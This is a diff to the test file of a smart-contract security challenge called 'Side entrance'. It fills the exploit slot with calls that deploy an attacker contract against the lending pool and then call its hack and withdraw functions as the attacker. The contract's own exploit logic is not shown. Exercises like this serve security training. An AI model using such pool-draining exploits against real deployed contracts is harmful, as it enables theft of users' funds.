@@ -26,6 +26,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const HackContract = contract.fromArtifact('HackSideEntranceLenderPool');
+        const hackInstance = await HackContract.new(this.pool.address, { from: attacker });
+        await hackInstance.hack({ from: attacker });
+        await hackInstance.withdraw({ from: attacker });
     });
 
     after(async function () {
